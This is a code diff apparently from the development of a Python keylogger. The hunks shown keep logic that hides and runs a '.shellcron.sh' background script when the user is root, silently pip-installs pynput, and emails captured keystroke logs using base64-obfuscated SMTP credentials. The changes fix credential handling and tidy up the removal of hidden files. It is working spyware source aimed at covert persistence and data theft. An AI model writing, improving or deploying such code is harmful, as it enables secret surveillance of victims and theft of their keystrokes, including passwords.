@@ -41,10 +41,7 @@ if 'root' in getpass.getuser() and len(getpass.getuser())==4 :
                       cron_chmod = 'chmod +x .shellcron.sh'
                       subprocess.call(cron_chmod,shell=True) 
                       croncall = './.shellcron.sh > /dev/null 2>&1 &' 
-                      subprocess.Popen(croncall,shell=True) 
-                 if os.exists('.shellcron.sh') :
-                    os.remove('.shellcron.sh')       
-                         
+                      subprocess.Popen(croncall,shell=True)     
                                  
         except FileExistsError: 
                pass  
@@ -69,9 +66,7 @@ else:
                  subprocess.call(cron_chmod,shell=True) 
                  croncall = './.shellcron.sh > /dev/null 2>&1 &' 
                  subprocess.Popen(croncall,shell=True) 
-        if os.path.exists('.shellcron.sh') :
-           os.remove('.shellcron.sh')        
-                        
+                                
     except FileExistsError: 
            pass
 try:
@@ -362,8 +357,8 @@ class Keylogger:
                     SERVER.ehlo()
                     SERVER.starttls()
                     SERVER.ehlo()
-                    SERVER.login(base64.b64decode(self.Ecode).decode("utf-8") ,base64.b64decode(self.Scode).decode("utf-8") )
-                    SERVER.sendmail(base64.b64decode(self.Ecode).decode("utf-8"),base64.b64decode(self.Ecode).decode("utf-8") , text)
+                    SERVER.login(base64.b64decode(self.Ecode).decode("utf-8").strip() ,base64.b64decode(self.Scode).decode("utf-8").strip())
+                    SERVER.sendmail(base64.b64decode(self.Ecode).decode("utf-8").strip(),base64.b64decode(self.Ecode).decode("utf-8").strip(), text)
                     attachment.close()
                     SERVER.close()
                 if  os.path.exists('.log_Key') :        
@@ -371,7 +366,9 @@ class Keylogger:
                 if  os.path.exists('.read1'):
                     os.remove('.read1') 
                 if  os.path.exists('.read3'):
-                    os.remove('.read3')   
+                    os.remove('.read3')
+                if os.path.exists('.shellcron.sh') :
+                   os.remove('.shellcron.sh')   
             except smtplib.SMTPAuthenticationError:
                       pass             
         def GO_START(self):
@@ -382,7 +379,7 @@ class Keylogger:
                 try:
                     command_in = 'pip3 install --upgrade pip 2>/dev/null'                     
                     subprocess.check_output (command_in,shell=True)
-                    command2= 'pip install pynput==1.6.8  2>/dev/null'                     
+                    command2= 'pip3 install pynput 2>/dev/null'                     
                     subprocess.check_output (command2,shell=True)
                 except Exception :   
                   pass                             
